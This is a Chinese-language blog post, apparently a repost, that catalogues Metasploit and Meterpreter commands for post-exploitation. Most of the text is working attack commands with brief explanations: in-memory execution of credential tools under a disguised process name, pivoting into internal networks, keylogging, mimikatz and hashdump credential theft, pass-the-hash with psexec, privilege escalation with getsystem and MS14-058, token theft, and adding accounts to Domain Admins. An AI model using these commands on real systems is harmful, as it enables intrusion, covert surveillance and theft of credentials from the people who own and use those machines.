---
layout: post
title:  "Metasploit 渗透测试框架的基本使用"
date:   2021-03-06
categories: 网络安全
tags: msf使用
---

* content
{:toc}
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094443161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
##  msf框架
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094502808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094519883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
##  msf基本命令
###  1.基本命令

```bash
help# 查看Meterpreter帮助
background#返回，把meterpreter后台挂起
bgkill# 杀死一个背景 meterpreter 脚本
bglist#提供所有正在运行的后台脚本的列表
bgrun#作为一个后台线程运行脚本
channel#显示活动频道
sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用
sesssions -k  number #与会话进行交互
close# 关闭通道
exit# 终止 meterpreter 会话
quit# 终止 meterpreter 会话
interact id #切换进一个信道
run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
irb# 进入 Ruby 脚本模式
read# 从通道读取数据
write# 将数据写入到一个通道
run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本
use# 加载 meterpreter 的扩展
load/use#加载模块
Resource#执行一个已有的rc脚本
```
###  2.文件系统命令
```bash
del c:\boot.ini #删除指定的文件
upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\
download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\"ProgramFiles"\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/
edit c:\boot.ini  # 编辑文件
getlwd#打印本地目录
lcd#更改本地目录
ls#列出在当前目录中的文件列表
lpwd#打印本地目录
cd c:\\ #进入目录文件下
rm file #删除文件
rmdir#受害者系统上删除目录
search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc
meterpreter > search -f autoexec.bat  #搜索文件
meterpreter > search -f sea*.bat c:\\xamp\\
enumdesktops     #用户登录数
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210307141420442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
这样太明显，如果希望隐藏后台执行，加参数-H
```bash
execute  -H -f notepad.exe
```
再看一个，我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上命令：
```bash
execute  -H -i -f cmd.exe
```
这达到的效果就跟使用shell命令一样了
再来一个，在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。
```bash
execute  -H -m -d notepad.exe-f  wce.exe -a "-o wce.txt"
-d 在目标主机执行时显示的进程名称（用以伪装）
-m 直接从内存中执行
 "-o wce.txt"是wce.exe的运行参数
 ```

###  3.网络命令
```bash
ipconfig/ifconfig#显示网络接口的关键信息，包括 IP 地址
portfwd -h
用法：portfwd [-h] [add | delete | list | flush] [args]
选项：
    -L <opt>要监听的本地主机（可选）
    -h帮助横幅
    -l <opt>要监听的本地端口
    -p <opt>连接到的远程端口
    -r <opt>要连接到的远程主机
portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444
netstat -an | grep“4444"  #查看指定端口开放情况
rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码
rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接
route#查看或修改受害者路由表
route add 192.168.1.0 255.255.255.0 1 #添加动态路由
route print #路由表输出
runget_local_subnets #目标主机的内网IP段情况
Arp       #看ARP缓冲表
Getproxy     #获取代理
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210307141942542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210307142041694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。

```shell
查看shell网络环境：

meterpreter>run get_local_subnets

添加一条通向目标服务器内网的路由

meterpreter>run autoroute -s 100.0.0.0/8   #(根据目标内网网络而定)

查看路由设置：

meterpreter>run autoroute –p

一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf>，查看下外面的路由情况。

route print

如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。

msf>route add 10.0.0.0 255.0.0.0 1

说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。
```

###  4.键盘监听
```bash

Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：

keyscan_start：开启键盘记录功能

keyscan_dump：显示捕捉到的键盘记录信息

keyscan_stop：停止键盘记录功能

uictl enable keyboard/mouse#接管目标主机的键盘和鼠标。

meterpreter > keyscan_start #针对远程目标主机开启键盘记录功能

Starting the keystroke sniffer...

meterpreter > keyscan_dump #存储目标主机上捕获的键盘记录

Dumping captured keystrokes...

dir <Return> cd<Ctrl>  <LCtrl>

meterpreter > keyscan_stop #停止针对目标主机的键盘记录

Stopping the keystroke sniffer...
```
这里需要注意一下windows会话窗口的概念，windows桌面划分为不同的会话(session)，以便于与windows交互。会话0代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在0中进行。可以使用getdesktop查看或者截张图试试。否则使用setdesktop切换。

###  5.系统命令

```bash
reg#与受害人的注册表进行交互

rev2self#回到控制目标主机的初始用户账户下

shell#获得控制台权限

sysinfo # 查看目标机系统信息，如机器名，操作系统等

add_user username password -h ip    #在远程目标主机上添加一个用户

add_group_user "Domain Admins" username -h ip    #将用户添加到目标主机的域管理员组中

shell命令

获取目标主机的远程命令行shell,如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用migrate注入到管理员用户进程中再尝试
```
###  密码解密mimikatz
**法国神器mimikatz可以直接获得操作系统的明文密码,meterpreter添加了这个模块**

```bash
meterpreter > load mimikatz  #加载mimikatz

meterpreter > msv #获取hash值

meterpreter > kerberos #获取明文

meterpreter >ssp   #获取明文信息

meterpreter > wdigest #获取系统账户信息

meterpreter >mimikatz_command -f a::   #必须要以错误的模块来让正确的模块显示

meterpreter >mimikatz_command -f hash::   #获取目标 hash

meterpreter > mimikatz_command -f samdump::hashes

meterpreter > mimikatz_command -f sekurlsa::searchPasswords
```
###  7.网络嗅探

```bash
meterpreter > use sniffer # 加载嗅探模块

Loading extension sniffer...success.

meterpreter > sniffer_interfaces #列出目标主机所有开放的网络接口

    1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )

    2 - 'Intel(R) PRO/1000 MT Desktop Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )

    3 - 'Cisco Systems VPN Adapter' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )

meterpreter > sniffer_start 2 #获取正在实施嗅探网络接口的统计数据

[*] Capture started on interface 2 (50000 packet buffer)

meterpreter > sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探

[*] Flushing packet capture buffer for interface 2...

[*] Flushed 1176 packets (443692 bytes)

[*] Downloaded 100% (443692/443692)...

[*] Download completed, converting to PCAP...

[*] PCAP file written to /tmp/test2.cap

meterpreter > sniffer_stop  2   #停止嗅探
```

对抓取的包进行解包：

```bash
use auxiliary/sniffer/psnuffle

set pcapfile 1.cap

run
```
###  8.获取敏感信息

```bash

run post/windows/gather/checkvm #是否虚拟机

run post/windows/gather/enum_applications #获取安装软件信息

run post/windows/gather/dumplinks   #获取最近的文件操作

run post/windows/gather/enum_ie  #获取IE缓存

run post/windows/gather/enum_chrome   #获取Chrome缓存

run scraper                      #获取常见信息

#保存在～/.msf4/logs/scripts/scraper/目录下

(1)post/windows/gather/enum_application模块获取目标主机上的软件安装信息

命令：run post/windows/gather/enum_applications
```

**获取到的目标主机上的ie浏览器缓存历史记录和cookies信息等都保存到了攻击主机本地的/root/.msf5/loot/目录下,这里说IE7以上才有效**

###  9.获取Hash

```bash

使用“hashdump”命令可以从系统提取用户名和密码hashes。使用hashdump命令可以获取目标主机的SAM文件，获取目标主机的账号密码hash信息，剩下的可以用爆破软件算出明文密码，微软一般用LM,NTML和NTLMv2形式的哈希表存储密码。若想运行这个命令, 需要有注册表和SAM [Security Account Manager]的系统的权限，如果你是作为一个普通的用户登陆的话，你需要提升权限,这我们将在后面提到。

meterpreter > run post/windows/gather/smart_hashdump
```
数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::，所以我们得到了三个用户账号，分别为Administrator, Guest和Coen。

其中的LM哈希（aad3b435b51404eeaad3b435b51404ee）跟NTLM哈希（31d6cfe0d16ae931b73c59d7e0c089c0）对应的是一个空密码。

接下来要处理的就是用户Coen的密码（f773c5db7ddebefa4b0dae7ee8c50aea）了。虽然我们可以使用类似John the Ripper这样的工具来破解密码，但是我们直接Google这个哈希之后，就直接得到了密码明文：trustno1。

```bash
use post/windows/gather/hashdump

set session 4

run

20161006155822

检查已有权限+系统类型  
检查是否为域控制器  
从注册表读hash，若失败，注入LSASS进程；若域控制器，直接注入LSASS进程  
若win2008+会话管理员权限，尝试使用getsystem，若在system不能注入LSASS，先migrate到system权限下的进程，继续注入LSASS  
若win7/Vista+UAC关闭+会话管理员权限，尝试getsystem，读取hash  
若win2003/xp/2000，直接getsystem，读取hash  
```


###  10.通过Hash获取权限

```bash
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.0.254
msf exploit(psexec) > set SMBUser isosky
msf exploit(psexec) > set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537   
msf exploit(psexec) > exploit
```
###  11.捕捉屏幕
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/96d8e2fb91a9b05a4375a9e6f285aff0.gif#pic_center)
###  12.得到远程桌面

```bash
run vnc
```
###  13.权限提升

```bash
这是meterpreter中实施漏洞利用系统特权要求的一个重要的模块。为了这个目的,我们必须用PRIV extention.，在旧版本的Metasploit中Priv extension并不自动装载，使用“use priv”手动加载的。然而在后来的msf版本中并不需要担心这一点。

使用“getuid”获得当前的权限，migrate+PID迁移进程（当我们攻击一个系统是，常常是对像是IE之类的服务漏洞进行利用的，可是不免有对方关闭IE的情况，那么我们的meterpreter会话将会关闭，从而导致与目标系统失去连接，所以我们可以使用迁移进程后的攻击模块，将sessions迁移到内存空间中的其他稳定的、不会被关闭的服务进程中，以维持稳定的系统控制），从列表中看到PID为500的是administrator权限，所以是迁移到administrator的权限，“getsystem –h”升级为权限SYSTEM账户。这个模块可以用来提升我们的特权，有四个技巧。Meterpreter自动检查四个方法并且尝试其最好方法。然后看到我们权限又变为了system权限了。

kill pid # 杀死进程

migrate pid # 将Meterpreter会话移植到进程数为pid的进程中,需要注意的是如果存在杀软的话可能会阻止进程注入，所以把会话进程注入到svchost.exe是一个好方法

getprivs#尽可能获取尽可能多的特权

getuid #获得当前的权限

getsystem #通过各种攻击向量将一个管理帐户（通常为本地Administrator账户）提升为本地SYSTEM帐户

getsystem –h #升级权限SYSTEM账户

使用MS14-058之类的Exp进行提权:

meterpreter > background

[*] Backgrounding session 3..

msf exploit(handler) > use exploit/windows/local/ms14_058_track_popup_menu

msf exploit(ms14_058_track_popup_menu) > set SESSION 3

use priv#加载特权提升扩展模块，来扩展Meterpreter库
```
###  14.盗取令牌

```bash
meterpreter >use incognito    加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)

meterpreter >list_tokens -u    列出目标主机用户的可用令牌

meterpreter >list_tokens -g    列出目标主机用户组的可用令牌

meterpreter >impersonate_token DOMAIN_NAME\\USERNAME    假冒目标主机上的可用令牌,如meterpreter > impersonate_token QLWEB\\Administrato

meterpreter >execute -f cmd.exe -i -t #调用域权限shell

meterpreter > getuid

meterpreter>add_user 0xfa funny –h192.168.3.98  #在域控主机上添加账户

meterpreter>reg command   # 在目标主机注册表中进行交互，创建，删除，查询等操作

meterpreter>setdesktop number   #切换到另一个用户界面（该功能基于哪些用户已登录）

meterpreter>ps #查看目标机器进程，找出域控账户运行的进程ID

meterpreter>steal_token pid #盗窃给定进行的可用令牌并进行令牌假冒

meterpreter>drop_token pid #停止假冒当前令牌

 

 

另一个提权的方法是扮演一个帐户从一个特定进程偷取令牌。为此，我们需要“incognito”扩展，使用“steal_token+PID”这个例子中我们使用的是steal_token 640，其中由前面执行ps后得到的信息可知，PID为640的权限为administrator，所以我们在执行命令后虽然提示错误信息，但是它仍会被成功在后台执行，所以在运行steal_token后核实UID，我们的权限就变为了administrator了。
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609480862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094827566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094856583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094914642.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094936216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094952551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095006769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609502037.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
###  模块相关的命令use的使用方法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095033285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095046711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095108265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095121342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095142190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
###  使用show命令查看模块的相关信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609523646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095430583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
#  使用msf渗透攻击Win7主机并远程执行命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609544657.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095455820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095506720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095522139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095544162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095601806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095617101.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095629267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095642638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095658513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095711678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095736444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095748823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095800191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
##  使用 msf扫描靶机上mysql服务的空密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095821355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095854329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095934564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095943726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
##  metasploit之间通讯
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095952945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100006456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100018208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030610003881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100057165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/202103061001071.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100122544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)



